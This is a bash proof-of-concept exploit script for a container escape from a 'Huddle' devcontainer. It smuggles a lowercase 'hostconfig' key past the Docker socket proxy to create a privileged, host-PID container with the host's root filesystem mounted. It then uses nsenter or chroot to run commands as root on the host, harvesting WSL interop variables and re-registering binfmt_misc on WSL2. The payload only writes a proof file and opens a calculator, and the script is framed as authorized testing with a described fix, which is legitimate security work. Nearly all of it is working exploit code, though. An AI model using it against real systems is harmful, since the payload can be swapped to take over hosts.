#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# PoC: host command execution from inside a Huddle devcontainer
# Demonstrates finding #1 (case-insensitive HostConfig bypass) on the classic
# socket-proxy. Authorized security testing only — run against your OWN Huddle
# instance to confirm the finding in docs/security/dind-findings-vs-main.md.
#
# Payload is deliberately harmless: it launches a calculator on the host (the
# classic "pop calc" proof) AND drops a proof-of-execution file. It does NOT
# persist, exfiltrate, or destroy anything, and it cleans up the helper
# container. Read it before running.
#
#   HOW IT WORKS
#   The proxy validates `body.HostConfig` with EXACT-CASE key access, but
#   dockerd's Go JSON decoder matches struct fields CASE-INSENSITIVELY. Sending
#   the create body with a lowercase `hostconfig` key makes the proxy inspect
#   `body.HostConfig === undefined` (→ allow), while dockerd still honours the
#   privileged / host-PID / host-rootfs settings. We then run in the host's
#   namespaces via nsenter.
#
#   THE FIX (see report): deep-lowercase keys before validation (lowerKeysDeep)
#   and read HostConfig case-insensitively in the router.
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

# ── Locate the Docker proxy socket exposed inside the devcontainer ────────────
SOCK=""
if [[ -n "${DOCKER_HOST:-}" && "${DOCKER_HOST}" == unix://* ]]; then
  SOCK="${DOCKER_HOST#unix://}"
fi
for cand in "$SOCK" /var/run/huddle/docker.sock /var/run/dind/docker.sock /var/run/docker.sock; do
  if [[ -n "$cand" && -S "$cand" ]]; then SOCK="$cand"; break; fi
done
[[ -S "$SOCK" ]] || { echo "no docker proxy socket found (set DOCKER_HOST)"; exit 1; }
echo "[*] using proxy socket: $SOCK"

API="http://d"
CURL=(curl -s --unix-socket "$SOCK")
IMAGE="${POC_IMAGE:-alpine:3.20}"
STAMP="poc-$$"                       # unique-ish tag; no Date.now needed
PROOF="/tmp/huddle-host-escape-${STAMP}.txt"

# ── The payload that runs INSIDE the escaping container ───────────────────────
# The host root fs is bind-mounted at /host and we share the host PID namespace.
# Alpine busybox has no nsenter — install util-linux first.
# WSL2: Windows interop needs explicit paths to cmd.exe/powershell.exe.
read -r -d '' PAYLOAD <<'PAYLOAD_EOF' || true
set -x

# alpine busybox has no nsenter
if ! command -v nsenter >/dev/null 2>&1; then
  echo "[*] installing nsenter (util-linux) ..."
  apk add --no-cache util-linux >/dev/null 2>&1 || echo "[!] apk add failed"
fi

PROOF="PROOF_PLACEHOLDER"

# ── 1) write proof via nsenter (host namespaces) ─────────────
echo "[*] nsenter into host PID 1 ..."
if nsenter -t 1 -m -u -i -n -p -- sh -c "
  echo 'HUDDLE HOST-ESCAPE PoC' > '$PROOF'
  id >> '$PROOF'
  uname -a >> '$PROOF'
  hostname >> '$PROOF'
"; then
  echo "[+] proof written to host:$PROOF via nsenter"
else
  echo "[!] nsenter failed — using chroot /host"
  chroot /host sh -c "
    echo 'HUDDLE HOST-ESCAPE PoC (chroot)' > '$PROOF'
    id >> '$PROOF'
    uname -a >> '$PROOF'
    hostname >> '$PROOF'
  " && echo "[+] proof written to host:$PROOF via chroot"
fi

# ── 2) pop calc ──────────────────────────────────────────────
if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
  echo "[*] WSL2 detected — launching calc via Windows interop"
  # WSL2->Windows interop needs WSL_INTEROP (the per-session /run/WSL/<id>_interop
  # socket) in the launching env. nsenter RESETS the environment, so a bare
  # `nsenter -- cmd.exe` no-ops even though the escape itself worked. pidmode:host
  # exposes the host PID ns — harvest a live WSL_INTEROP and pass it through.
  interop=""
  for e in /proc/*/environ; do
    v=$(tr "\0" "\n" < "$e" 2>/dev/null | sed -n "s/^WSL_INTEROP=//p" | head -1)
    [ -n "$v" ] && { interop="$v"; break; }
  done
  if [ -n "$interop" ]; then
    echo "[*] harvested WSL_INTEROP=$interop"
  else
    echo "[!] no WSL_INTEROP in host procs — interop launch may still no-op"
  fi
  # binfmt_misc: kernel needs WSLInterop entry to exec PE binaries via /init.
  # Inside nsenter context it may be missing — re-register if so (we are root).
  echo "[*] checking binfmt_misc WSLInterop in host namespace ..."
  nsenter -t 1 -m -u -i -n -p -- sh -c '
    if [ ! -d /proc/sys/fs/binfmt_misc ]; then
      mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc 2>/dev/null
    fi
    if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ]; then
      echo "[*] WSLInterop already registered"
      head -2 /proc/sys/fs/binfmt_misc/WSLInterop
    else
      echo "[*] WSLInterop missing — registering"
      echo ":WSLInterop:M::MZ::/init:" > /proc/sys/fs/binfmt_misc/register 2>/dev/null \
        && echo "[+] registered" || echo "[!] register failed"
    fi
  '

  runwin() { nsenter -t 1 -m -u -i -n -p -- env WSL_INTEROP="$interop" "$@"; }
  runwin /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
    && echo "[+] calc launched (cmd.exe via binfmt)" && exit 0
  runwin /init /mnt/c/Windows/System32/cmd.exe /c start calc 2>&1 \
    && echo "[+] calc launched (cmd.exe via /init)" && exit 0
  runwin /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
    -NoProfile -Command "Start-Process calc" 2>&1 \
    && echo "[+] calc launched (powershell)" && exit 0
  runwin /init /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe \
    -NoProfile -Command "Start-Process calc" 2>&1 \
    && echo "[+] calc launched (powershell via /init)" && exit 0
  echo "[!] all WSL2 calc methods failed — check proof file: $PROOF"
else
  echo "[*] native Linux — launching calc"
  for c in gnome-calculator kcalc xcalc xterm; do
    DISPLAY="${DISPLAY:-:0}" nsenter -t 1 -m -u -i -n -p -- "$c" >/dev/null 2>&1 \
      && echo "[+] launched $c" && exit 0
  done
  echo "[!] no GUI calc found — check proof file: $PROOF"
fi
PAYLOAD_EOF
PAYLOAD="${PAYLOAD//PROOF_PLACEHOLDER/$PROOF}"

# ── Make sure the image is present (image pull is allowed through the proxy) ──
echo "[*] pulling $IMAGE via proxy ..."
"${CURL[@]}" -X POST "$API/images/create?fromImage=${IMAGE%%:*}&tag=${IMAGE##*:}" >/dev/null || true

# ── Create the escaping container using the lowercase `hostconfig` bypass ─────
# NOTE: the docker CLI always capitalises HostConfig, so we craft the raw request.
# The payload is base64-encoded to avoid any JSON/shell quoting issues.
PAYLOAD_B64=$(printf '%s' "$PAYLOAD" | base64 | tr -d '\n')
CREATE_BODY=$(cat <<JSON
{
  "Image": "$IMAGE",
  "Cmd": ["/bin/sh","-c","echo $PAYLOAD_B64 | base64 -d | /bin/sh"],
  "hostconfig": { "privileged": true, "pidmode": "host", "binds": ["/:/host"] }
}
JSON
)

echo "[*] creating escaping container (lowercase hostconfig → skips proxy guard) ..."
CID=$("${CURL[@]}" -X POST -H 'Content-Type: application/json' \
      -d "$CREATE_BODY" "$API/containers/create?name=huddle-poc-$STAMP" \
      | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p')

if [[ -z "$CID" ]]; then
  echo "[-] create was refused — the proxy on this instance is NOT vulnerable (patched?)."
  echo "    Response above. Finding #1 appears closed here."
  exit 2
fi
echo "[+] created $CID — proxy accepted a PRIVILEGED + host-PID + host-rootfs container."

cleanup() { "${CURL[@]}" -X DELETE "$API/containers/$CID?force=true" >/dev/null 2>&1 || true; }
trap cleanup EXIT

echo "[*] starting it ..."
"${CURL[@]}" -X POST "$API/containers/$CID/start" >/dev/null
"${CURL[@]}" -X POST "$API/containers/$CID/wait" >/dev/null || true

echo
echo "[+] ESCAPE CONFIRMED. Check the host for a calculator window and the proof file:"
echo "      (on the host)  $PROOF"
echo "[*] container logs:"
"${CURL[@]}" "$API/containers/$CID/logs?stdout=true&stderr=true" | tr -d '\r' | sed 's/^/      /'
